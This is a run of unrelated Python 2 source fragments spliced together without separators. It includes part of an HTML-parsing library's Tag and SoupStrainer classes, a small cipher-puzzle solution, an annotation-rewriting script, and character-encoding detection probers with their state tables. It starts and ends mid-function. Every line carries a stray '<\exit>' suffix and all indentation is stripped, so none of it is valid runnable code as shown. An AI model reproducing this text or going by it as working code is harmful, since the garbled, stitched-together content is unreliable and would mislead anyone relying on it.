elif system_id is not None:<\exit>
value += ' SYSTEM "%s"' % system_id<\exit>
return Doctype(value)<\exit>
PREFIX = u'<!DOCTYPE '<\exit>
SUFFIX = u'>\n'<\exit>
class Tag(PageElement):<\exit>
def __init__(self, parser=None, builder=None, name=None, namespace=None,<\exit>
prefix=None, attrs=None, parent=None, previous=None):<\exit>
"Basic constructor."<\exit>
if parser is None:<\exit>
self.parser_class = None<\exit>
else:<\exit>
self.parser_class = parser.__class__<\exit>
if name is None:<\exit>
raise ValueError("No value provided for new tag's name.")<\exit>
self.name = name<\exit>
self.namespace = namespace<\exit>
self.prefix = prefix<\exit>
if attrs is None:<\exit>
attrs = {}<\exit>
elif builder.cdata_list_attributes:<\exit>
attrs = builder._replace_cdata_list_attribute_values(<\exit>
self.name, attrs)<\exit>
else:<\exit>
attrs = dict(attrs)<\exit>
self.attrs = attrs<\exit>
self.contents = []<\exit>
self.setup(parent, previous)<\exit>
self.hidden = False<\exit>
if builder is not None:<\exit>
builder.set_up_substitutions(self)<\exit>
self.can_be_empty_element = builder.can_be_empty_element(name)<\exit>
else:<\exit>
self.can_be_empty_element = False<\exit>
parserClass = _alias("parser_class")<\exit>
@property<\exit>
def is_empty_element(self):<\exit>
return len(self.contents) == 0 and self.can_be_empty_element<\exit>
isSelfClosing = is_empty_element<\exit>
@property<\exit>
def string(self):<\exit>
if len(self.contents) != 1:<\exit>
return None<\exit>
child = self.contents[0]<\exit>
if isinstance(child, NavigableString):<\exit>
return child<\exit>
return child.string<\exit>
@string.setter<\exit>
def string(self, string):<\exit>
self.clear()<\exit>
self.append(string.__class__(string))<\exit>
def _all_strings(self, strip=False):<\exit>
for descendant in self.descendants:<\exit>
if not isinstance(descendant, NavigableString):<\exit>
continue<\exit>
if strip:<\exit>
descendant = descendant.strip()<\exit>
if len(descendant) == 0:<\exit>
continue<\exit>
yield descendant<\exit>
strings = property(_all_strings)<\exit>
@property<\exit>
def stripped_strings(self):<\exit>
for string in self._all_strings(True):<\exit>
yield string<\exit>
def get_text(self, separator=u"", strip=False):<\exit>
return separator.join([s for s in self._all_strings(strip)])<\exit>
getText = get_text<\exit>
text = property(get_text)<\exit>
def decompose(self):<\exit>
self.extract()<\exit>
i = self<\exit>
while i is not None:<\exit>
next = i.next_element<\exit>
i.__dict__.clear()<\exit>
i = next<\exit>
def clear(self, decompose=False):<\exit>
if decompose:<\exit>
for element in self.contents[:]:<\exit>
if isinstance(element, Tag):<\exit>
element.decompose()<\exit>
else:<\exit>
element.extract()<\exit>
else:<\exit>
for element in self.contents[:]:<\exit>
element.extract()<\exit>
def index(self, element):<\exit>
for i, child in enumerate(self.contents):<\exit>
if child is element:<\exit>
return i<\exit>
raise ValueError("Tag.index: element not in tag")<\exit>
def get(self, key, default=None):<\exit>
return self.attrs.get(key, default)<\exit>
def has_attr(self, key):<\exit>
return key in self.attrs<\exit>
def __hash__(self):<\exit>
return str(self).__hash__()<\exit>
def __getitem__(self, key):<\exit>
return self.attrs[key]<\exit>
def __iter__(self):<\exit>
"Iterating over a tag iterates over its contents."<\exit>
return iter(self.contents)<\exit>
def __len__(self):<\exit>
"The length of a tag is the length of its list of contents."<\exit>
return len(self.contents)<\exit>
def __contains__(self, x):<\exit>
return x in self.contents<\exit>
def __nonzero__(self):<\exit>
"A tag is non-None even if it has no contents."<\exit>
return True<\exit>
def __setitem__(self, key, value):<\exit>
self.attrs[key] = value<\exit>
def __delitem__(self, key):<\exit>
"Deleting tag[key] deletes all 'key' attributes for the tag."<\exit>
self.attrs.pop(key, None)<\exit>
def __call__(self, *args, **kwargs):<\exit>
return self.find_all(*args, **kwargs)<\exit>
def __getattr__(self, tag):<\exit>
if len(tag) > 3 and tag.endswith('Tag'):<\exit>
tag_name = tag[:-3]<\exit>
warnings.warn(<\exit>
'.%sTag is deprecated, use .find("%s") instead.' % (<\exit>
tag_name, tag_name))<\exit>
return self.find(tag_name)<\exit>
elif not tag.startswith("__") and not tag=="contents":<\exit>
return self.find(tag)<\exit>
raise AttributeError(<\exit>
"'%s' object has no attribute '%s'" % (self.__class__, tag))<\exit>
def __eq__(self, other):<\exit>
if self is other:<\exit>
return True<\exit>
if (not hasattr(other, 'name') or<\exit>
not hasattr(other, 'attrs') or<\exit>
not hasattr(other, 'contents') or<\exit>
self.name != other.name or<\exit>
self.attrs != other.attrs or<\exit>
len(self) != len(other)):<\exit>
return False<\exit>
for i, my_child in enumerate(self.contents):<\exit>
if my_child != other.contents[i]:<\exit>
return False<\exit>
return True<\exit>
def __ne__(self, other):<\exit>
return not self == other<\exit>
def __repr__(self, encoding=DEFAULT_OUTPUT_ENCODING):<\exit>
return self.encode(encoding)<\exit>
def __unicode__(self):<\exit>
return self.decode()<\exit>
def __str__(self):<\exit>
return self.encode()<\exit>
if PY3K:<\exit>
__str__ = __repr__ = __unicode__<\exit>
def encode(self, encoding=DEFAULT_OUTPUT_ENCODING,<\exit>
indent_level=None, formatter="minimal",<\exit>
errors="xmlcharrefreplace"):<\exit>
u = self.decode(indent_level, encoding, formatter)<\exit>
return u.encode(encoding, errors)<\exit>
def decode(self, indent_level=None,<\exit>
eventual_encoding=DEFAULT_OUTPUT_ENCODING,<\exit>
formatter="minimal"):<\exit>
attrs = []<\exit>
if self.attrs:<\exit>
for key, val in sorted(self.attrs.items()):<\exit>
if val is None:<\exit>
decoded = key<\exit>
else:<\exit>
if isinstance(val, list) or isinstance(val, tuple):<\exit>
val = ' '.join(val)<\exit>
elif not isinstance(val, basestring):<\exit>
val = unicode(val)<\exit>
elif (<\exit>
isinstance(val, AttributeValueWithCharsetSubstitution)<\exit>
and eventual_encoding is not None):<\exit>
val = val.encode(eventual_encoding)<\exit>
text = self.format_string(val, formatter)<\exit>
decoded = (<\exit>
unicode(key) + '='<\exit>
+ EntitySubstitution.quoted_attribute_value(text))<\exit>
attrs.append(decoded)<\exit>
close = ''<\exit>
closeTag = ''<\exit>
prefix = ''<\exit>
if self.prefix:<\exit>
prefix = self.prefix + ":"<\exit>
if self.is_empty_element:<\exit>
close = '/'<\exit>
else:<\exit>
closeTag = '</%s%s>' % (prefix, self.name)<\exit>
pretty_print = (indent_level is not None)<\exit>
if pretty_print:<\exit>
space = (' ' * (indent_level - 1))<\exit>
indent_contents = indent_level + 1<\exit>
else:<\exit>
space = ''<\exit>
indent_contents = None<\exit>
contents = self.decode_contents(<\exit>
indent_contents, eventual_encoding, formatter)<\exit>
if self.hidden:<\exit>
s = contents<\exit>
else:<\exit>
s = []<\exit>
attribute_string = ''<\exit>
if attrs:<\exit>
attribute_string = ' ' + ' '.join(attrs)<\exit>
if pretty_print:<\exit>
s.append(space)<\exit>
s.append('<%s%s%s%s>' % (<\exit>
prefix, self.name, attribute_string, close))<\exit>
if pretty_print:<\exit>
s.append("\n")<\exit>
s.append(contents)<\exit>
if pretty_print and contents and contents[-1] != "\n":<\exit>
s.append("\n")<\exit>
if pretty_print and closeTag:<\exit>
s.append(space)<\exit>
s.append(closeTag)<\exit>
if pretty_print and closeTag and self.next_sibling:<\exit>
s.append("\n")<\exit>
s = ''.join(s)<\exit>
return s<\exit>
def prettify(self, encoding=None, formatter="minimal"):<\exit>
if encoding is None:<\exit>
return self.decode(True, formatter=formatter)<\exit>
else:<\exit>
return self.encode(encoding, True, formatter=formatter)<\exit>
def decode_contents(self, indent_level=None,<\exit>
eventual_encoding=DEFAULT_OUTPUT_ENCODING,<\exit>
formatter="minimal"):<\exit>
pretty_print = (indent_level is not None)<\exit>
s = []<\exit>
for c in self:<\exit>
text = None<\exit>
if isinstance(c, NavigableString):<\exit>
text = c.output_ready(formatter)<\exit>
elif isinstance(c, Tag):<\exit>
s.append(c.decode(indent_level, eventual_encoding,<\exit>
formatter))<\exit>
if text and indent_level:<\exit>
text = text.strip()<\exit>
if text:<\exit>
if pretty_print:<\exit>
s.append(" " * (indent_level - 1))<\exit>
s.append(text)<\exit>
if pretty_print:<\exit>
s.append("\n")<\exit>
return ''.join(s)<\exit>
def encode_contents(<\exit>
self, indent_level=None, encoding=DEFAULT_OUTPUT_ENCODING,<\exit>
formatter="minimal"):<\exit>
contents = self.decode_contents(indent_level, encoding, formatter)<\exit>
return contents.encode(encoding)<\exit>
def renderContents(self, encoding=DEFAULT_OUTPUT_ENCODING,<\exit>
prettyPrint=False, indentLevel=0):<\exit>
if not prettyPrint:<\exit>
indentLevel = None<\exit>
return self.encode_contents(<\exit>
indent_level=indentLevel, encoding=encoding)<\exit>
def find(self, name=None, attrs={}, recursive=True, text=None,<\exit>
**kwargs):<\exit>
r = None<\exit>
l = self.find_all(name, attrs, recursive, text, 1, **kwargs)<\exit>
if l:<\exit>
r = l[0]<\exit>
return r<\exit>
findChild = find<\exit>
def find_all(self, name=None, attrs={}, recursive=True, text=None,<\exit>
limit=None, **kwargs):<\exit>
generator = self.descendants<\exit>
if not recursive:<\exit>
generator = self.children<\exit>
return self._find_all(name, attrs, text, limit, generator, **kwargs)<\exit>
findAll = find_all<\exit>
findChildren = find_all<\exit>
@property<\exit>
def children(self):<\exit>
return iter(self.contents)<\exit>
@property<\exit>
def descendants(self):<\exit>
if not len(self.contents):<\exit>
return<\exit>
stopNode = self._last_descendant().next_element<\exit>
current = self.contents[0]<\exit>
while current is not stopNode:<\exit>
yield current<\exit>
current = current.next_element<\exit>
def childGenerator(self):<\exit>
return self.children<\exit>
def recursiveChildGenerator(self):<\exit>
return self.descendants<\exit>
has_key = has_attr<\exit>
class SoupStrainer(object):<\exit>
def __init__(self, name=None, attrs={}, text=None, **kwargs):<\exit>
self.name = self._normalize_search_value(name)<\exit>
if not isinstance(attrs, dict):<\exit>
kwargs['class'] = attrs<\exit>
attrs = None<\exit>
if 'class_' in kwargs:<\exit>
kwargs['class'] = kwargs['class_']<\exit>
del kwargs['class_']<\exit>
if kwargs:<\exit>
if attrs:<\exit>
attrs = attrs.copy()<\exit>
attrs.update(kwargs)<\exit>
else:<\exit>
attrs = kwargs<\exit>
normalized_attrs = {}<\exit>
for key, value in attrs.items():<\exit>
normalized_attrs[key] = self._normalize_search_value(value)<\exit>
self.attrs = normalized_attrs<\exit>
self.text = self._normalize_search_value(text)<\exit>
def _normalize_search_value(self, value):<\exit>
if (isinstance(value, unicode) or callable(value) or hasattr(value, 'match')<\exit>
or isinstance(value, bool) or value is None):<\exit>
return value<\exit>
if isinstance(value, bytes):<\exit>
return value.decode("utf8")<\exit>
if hasattr(value, '__iter__'):<\exit>
new_value = []<\exit>
for v in value:<\exit>
if (hasattr(v, '__iter__') and not isinstance(v, bytes)<\exit>
and not isinstance(v, unicode)):<\exit>
new_value.append(v)<\exit>
else:<\exit>
new_value.append(self._normalize_search_value(v))<\exit>
return new_value<\exit>
return unicode(str(value))<\exit>
def __str__(self):<\exit>
if self.text:<\exit>
return self.text<\exit>
else:<\exit>
return "%s|%s" % (self.name, self.attrs)<\exit>
def search_tag(self, markup_name=None, markup_attrs={}):<\exit>
found = None<\exit>
markup = None<\exit>
if isinstance(markup_name, Tag):<\exit>
markup = markup_name<\exit>
markup_attrs = markup<\exit>
call_function_with_tag_data = (<\exit>
isinstance(self.name, collections.Callable)<\exit>
and not isinstance(markup_name, Tag))<\exit>
if ((not self.name)<\exit>
or call_function_with_tag_data<\exit>
or (markup and self._matches(markup, self.name))<\exit>
or (not markup and self._matches(markup_name, self.name))):<\exit>
if call_function_with_tag_data:<\exit>
match = self.name(markup_name, markup_attrs)<\exit>
else:<\exit>
match = True<\exit>
markup_attr_map = None<\exit>
for attr, match_against in list(self.attrs.items()):<\exit>
if not markup_attr_map:<\exit>
if hasattr(markup_attrs, 'get'):<\exit>
markup_attr_map = markup_attrs<\exit>
else:<\exit>
markup_attr_map = {}<\exit>
for k, v in markup_attrs:<\exit>
markup_attr_map[k] = v<\exit>
attr_value = markup_attr_map.get(attr)<\exit>
if not self._matches(attr_value, match_against):<\exit>
match = False<\exit>
break<\exit>
if match:<\exit>
if markup:<\exit>
found = markup<\exit>
else:<\exit>
found = markup_name<\exit>
if found and self.text and not self._matches(found.string, self.text):<\exit>
found = None<\exit>
return found<\exit>
searchTag = search_tag<\exit>
def search(self, markup):<\exit>
found = None<\exit>
if hasattr(markup, '__iter__') and not isinstance(markup, (Tag, basestring)):<\exit>
for element in markup:<\exit>
if isinstance(element, NavigableString) \<\exit>
and self.search(element):<\exit>
found = element<\exit>
break<\exit>
elif isinstance(markup, Tag):<\exit>
if not self.text or self.name or self.attrs:<\exit>
found = self.search_tag(markup)<\exit>
elif isinstance(markup, NavigableString) or \<\exit>
isinstance(markup, basestring):<\exit>
if not self.name and not self.attrs and self._matches(markup, self.text):<\exit>
found = markup<\exit>
else:<\exit>
raise Exception(<\exit>
"I don't know how to match against a %s" % markup.__class__)<\exit>
return found<\exit>
def _matches(self, markup, match_against):<\exit>
result = False<\exit>
if isinstance(markup, list) or isinstance(markup, tuple):<\exit>
if (isinstance(match_against, unicode)<\exit>
and ' ' in match_against):<\exit>
return (whitespace_re.split(match_against) == markup)<\exit>
else:<\exit>
for item in markup:<\exit>
if self._matches(item, match_against):<\exit>
return True<\exit>
return False<\exit>
if match_against is True:<\exit>
return markup is not None<\exit>
if isinstance(match_against, collections.Callable):<\exit>
return match_against(markup)<\exit>
if isinstance(markup, Tag):<\exit>
markup = markup.name<\exit>
markup = self._normalize_search_value(markup)<\exit>
if markup is None:<\exit>
return not match_against<\exit>
if isinstance(match_against, unicode):<\exit>
return markup == match_against<\exit>
if hasattr(match_against, 'match'):<\exit>
return match_against.search(markup)<\exit>
if hasattr(match_against, '__iter__'):<\exit>
return markup in match_against<\exit>
class ResultSet(list):<\exit>
def __init__(self, source):<\exit>
list.__init__([])<\exit>
self.source = source<\exit>
from math import sqrt, floor, ceil<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
l = len(cipher)<\exit>
r = range(int(floor(sqrt(l))), int(ceil(sqrt(l))) + 1)<\exit>
min_pair = (r[-1], r[-1])<\exit>
for h in r:<\exit>
for w in r:<\exit>
if h * w >= l and h * w < min_pair[0] * min_pair[1]:<\exit>
min_pair = (h, w)<\exit>
h, w = min_pair<\exit>
rect = [[None for _ in xrange(w)] for _ in xrange(h)]<\exit>
for i in xrange(l):<\exit>
rect[i / w][i % w] = cipher[i]<\exit>
result = []<\exit>
for j in xrange(w):<\exit>
sb = []<\exit>
for i in xrange(h):<\exit>
if rect[i][j] == None: break<\exit>
sb.append(rect[i][j])<\exit>
result.append("".join(sb))<\exit>
return " ".join(result)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
cipher = f.readline().strip()<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
from __future__ import with_statement<\exit>
import sys<\exit>
import re<\exit>
try:<\exit>
import annotation<\exit>
except ImportError:<\exit>
import os.path<\exit>
from sys import path as sys_path<\exit>
sys_path.append(os.path.join(os.path.dirname(__file__), '../server/src'))<\exit>
import annotation<\exit>
sys_path.append(os.path.join(os.path.dirname(__file__), '..'))<\exit>
options = None<\exit>
def ent2event(anntype, fn):<\exit>
global options<\exit>
mapped = 0<\exit>
try:<\exit>
nosuff_fn = fn.replace(".ann","")<\exit>
with annotation.TextAnnotations(nosuff_fn) as ann_obj:<\exit>
for ann in ann_obj.get_entities():<\exit>
if ann.type != anntype:<\exit>
continue<\exit>
new_id = ann_obj.get_new_id('E')<\exit>
eann = annotation.EventAnnotation(ann.id, [], new_id, ann.type, '')<\exit>
for e in ann_obj.get_events():<\exit>
for i in range(0, len(e.args)):<\exit>
role, argid = e.args[i]<\exit>
if argid == ann.id:<\exit>
argid = new_id<\exit>
e.args[i] = role, argid<\exit>
for c in ann_obj.get_oneline_comments():<\exit>
if c.target == ann.id:<\exit>
c.target = new_id<\exit>
ann_obj.add_annotation(eann)<\exit>
mapped += 1<\exit>
if options.verbose:<\exit>
print >> sys.stderr, mapped, 'mapped in', fn<\exit>
except annotation.AnnotationFileNotFoundError:<\exit>
print >> sys.stderr, "%s:\tFailed: file not found" % fn<\exit>
except annotation.AnnotationNotFoundError, e:<\exit>
print >> sys.stderr, "%s:\tFailed: %s" % (fn, e)<\exit>
def argparser():<\exit>
import argparse<\exit>
ap=argparse.ArgumentParser(description="Rewrite entity annotations of a given type as events.")<\exit>
ap.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose output.")<\exit>
ap.add_argument("type", metavar="TYPE", help="Type to rewrite.")<\exit>
ap.add_argument("files", metavar="FILE", nargs="+", help="File to process.")<\exit>
return ap<\exit>
def main(argv=None):<\exit>
global options<\exit>
if argv is None:<\exit>
argv = sys.argv<\exit>
arg = argparser().parse_args(argv[1:])<\exit>
options = arg<\exit>
for fn in arg.files:<\exit>
ent2event(arg.type, fn)<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
sys.exit(main(sys.argv))<\exit>
from . import constants<\exit>
from .escsm import (HZSMModel, ISO2022CNSMModel, ISO2022JPSMModel,<\exit>
ISO2022KRSMModel)<\exit>
from .charsetprober import CharSetProber<\exit>
from .codingstatemachine import CodingStateMachine<\exit>
from .compat import wrap_ord<\exit>
class EscCharSetProber(CharSetProber):<\exit>
def __init__(self):<\exit>
CharSetProber.__init__(self)<\exit>
self._mCodingSM = [<\exit>
CodingStateMachine(HZSMModel),<\exit>
CodingStateMachine(ISO2022CNSMModel),<\exit>
CodingStateMachine(ISO2022JPSMModel),<\exit>
CodingStateMachine(ISO2022KRSMModel)<\exit>
]<\exit>
self.reset()<\exit>
def reset(self):<\exit>
CharSetProber.reset(self)<\exit>
for codingSM in self._mCodingSM:<\exit>
if not codingSM:<\exit>
continue<\exit>
codingSM.active = True<\exit>
codingSM.reset()<\exit>
self._mActiveSM = len(self._mCodingSM)<\exit>
self._mDetectedCharset = None<\exit>
def get_charset_name(self):<\exit>
return self._mDetectedCharset<\exit>
def get_confidence(self):<\exit>
if self._mDetectedCharset:<\exit>
return 0.99<\exit>
else:<\exit>
return 0.00<\exit>
def feed(self, aBuf):<\exit>
for c in aBuf:<\exit>
for codingSM in self._mCodingSM:<\exit>
if not codingSM:<\exit>
continue<\exit>
if not codingSM.active:<\exit>
continue<\exit>
codingState = codingSM.next_state(wrap_ord(c))<\exit>
if codingState == constants.eError:<\exit>
codingSM.active = False<\exit>
self._mActiveSM -= 1<\exit>
if self._mActiveSM <= 0:<\exit>
self._mState = constants.eNotMe<\exit>
return self.get_state()<\exit>
elif codingState == constants.eItsMe:<\exit>
self._mState = constants.eFoundIt<\exit>
self._mDetectedCharset = codingSM.get_coding_state_machine()<\exit>
return self.get_state()<\exit>
return self.get_state()<\exit>
from .constants import eStart, eError, eItsMe<\exit>
HZ_cls = (<\exit>
1,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,4,0,5,2,0,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
1,1,1,1,1,1,1,1,<\exit>
)<\exit>
HZ_st = (<\exit>
eStart,eError,     3,eStart,eStart,eStart,eError,eError,<\exit>
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eError,eError,eStart,eStart,     4,eError,<\exit>
5,eError,     6,eError,     5,     5,     4,eError,<\exit>
4,eError,     4,     4,     4,eError,     4,eError,<\exit>
4,eItsMe,eStart,eStart,eStart,eStart,eStart,eStart,<\exit>
)<\exit>
HZCharLenTable = (0, 0, 0, 0, 0, 0)<\exit>
HZSMModel = {'classTable': HZ_cls,<\exit>
'classFactor': 6,<\exit>
'stateTable': HZ_st,<\exit>
'charLenTable': HZCharLenTable,<\exit>
'name': "HZ-GB-2312"}<\exit>
ISO2022CN_cls = (<\exit>
2,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,1,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,3,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,4,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
)<\exit>
ISO2022CN_st = (<\exit>
eStart,     3,eError,eStart,eStart,eStart,eStart,eStart,<\exit>
eStart,eError,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eItsMe,eError,eError,eError,     4,eError,<\exit>
eError,eError,eError,eItsMe,eError,eError,eError,eError,<\exit>
5,     6,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eError,eItsMe,eError,eError,eError,eError,<\exit>
eError,eError,eError,eError,eError,eItsMe,eError,eStart,<\exit>
)<\exit>
ISO2022CNCharLenTable = (0, 0, 0, 0, 0, 0, 0, 0, 0)<\exit>
ISO2022CNSMModel = {'classTable': ISO2022CN_cls,<\exit>
'classFactor': 9,<\exit>
'stateTable': ISO2022CN_st,<\exit>
'charLenTable': ISO2022CNCharLenTable,<\exit>
'name': "ISO-2022-CN"}<\exit>
ISO2022JP_cls = (<\exit>
2,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,2,2,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,1,0,0,0,0,<\exit>
0,0,0,0,7,0,0,0,<\exit>
3,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
6,0,4,0,8,0,0,0,<\exit>
0,9,5,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
)<\exit>
ISO2022JP_st = (<\exit>
eStart,     3,eError,eStart,eStart,eStart,eStart,eStart,<\exit>
eStart,eStart,eError,eError,eError,eError,eError,eError,<\exit>
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eItsMe,eError,eError,<\exit>
eError,     5,eError,eError,eError,     4,eError,eError,<\exit>
eError,eError,eError,     6,eItsMe,eError,eItsMe,eError,<\exit>
eError,eError,eError,eError,eError,eError,eItsMe,eItsMe,<\exit>
eError,eError,eError,eItsMe,eError,eError,eError,eError,<\exit>
eError,eError,eError,eError,eItsMe,eError,eStart,eStart,<\exit>
)<\exit>
ISO2022JPCharLenTable = (0, 0, 0, 0, 0, 0, 0, 0, 0, 0)<\exit>
ISO2022JPSMModel = {'classTable': ISO2022JP_cls,<\exit>
'classFactor': 10,<\exit>
'stateTable': ISO2022JP_st,<\exit>
'charLenTable': ISO2022JPCharLenTable,<\exit>
'name': "ISO-2022-JP"}<\exit>
ISO2022KR_cls = (<\exit>
2,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,1,0,0,0,0,<\exit>
0,0,0,0,3,0,0,0,<\exit>
0,4,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,5,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
0,0,0,0,0,0,0,0,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
2,2,2,2,2,2,2,2,<\exit>
)<\exit>
ISO2022KR_st = (<\exit>
eStart,     3,eError,eStart,eStart,eStart,eError,eError,<\exit>
eError,eError,eError,eError,eItsMe,eItsMe,eItsMe,eItsMe,<\exit>
eItsMe,eItsMe,eError,eError,eError,     4,eError,eError,<\exit>
eError,eError,eError,eError,     5,eError,eError,eError,<\exit>
eError,eError,eError,eItsMe,eStart,eStart,eStart,eStart,<\exit>
)<\exit>
ISO2022KRCharLenTable = (0, 0, 0, 0, 0, 0)<\exit>
ISO2022KRSMModel = {'classTable': ISO2022KR_cls,<\exit>
'classFactor': 6,<\exit>
'stateTable': ISO2022KR_st,<\exit>
'charLenTable': ISO2022KRCharLenTable,<\exit>
'name': "ISO-2022-KR"}<\exit>
import sys<\exit>
from . import constants<\exit>
from .mbcharsetprober import MultiByteCharSetProber<\exit>
from .codingstatemachine import CodingStateMachine<\exit>
from .chardistribution import EUCJPDistributionAnalysis<\exit>
from .jpcntx import EUCJPContextAnalysis<\exit>
from .mbcssm import EUCJPSMModel<\exit>
class EUCJPProber(MultiByteCharSetProber):<\exit>
def __init__(self):<\exit>
MultiByteCharSetProber.__init__(self)<\exit>
self._mCodingSM = CodingStateMachine(EUCJPSMModel)<\exit>
self._mDistributionAnalyzer = EUCJPDistributionAnalysis()<\exit>
self._mContextAnalyzer = EUCJPContextAnalysis()<\exit>
self.reset()<\exit>
def reset(self):<\exit>
MultiByteCharSetProber.reset(self)<\exit>
self._mContextAnalyzer.reset()<\exit>
def get_charset_name(self):<\exit>
return "EUC-JP"<\exit>
def feed(self, aBuf):<\exit>
aLen = len(aBuf)<\exit>
for i in range(0, aLen):<\exit>
codingState = self._mCodingSM.next_state(aBuf[i])<\exit>
if codingState == constants.eError:<\exit>
if constants._debug:<\exit>
sys.stderr.write(self.get_charset_name()<\exit>
+ ' prober hit error at byte ' + str(i)<\exit>
+ '\n')<\exit>
self._mState = constants.eNotMe<\exit>
break<\exit>
elif codingState == constants.eItsMe:<\exit>
self._mState = constants.eFoundIt<\exit>
break<\exit>
elif codingState == constants.eStart:<\exit>
charLen = self._mCodingSM.get_current_charlen()<\exit>
if i == 0:<\exit>
self._mLastChar[1] = aBuf[0]<\exit>
self._mContextAnalyzer.feed(self._mLastChar, charLen)<\exit>
self._mDistributionAnalyzer.feed(self._mLastChar, charLen)<\exit>
else:<\exit>
self._mContextAnalyzer.feed(aBuf[i - 1:i + 1], charLen)<\exit>
self._mDistributionAnalyzer.feed(aBuf[i - 1:i + 1],<\exit>
charLen)<\exit>
self._mLastChar[0] = aBuf[aLen - 1]<\exit>
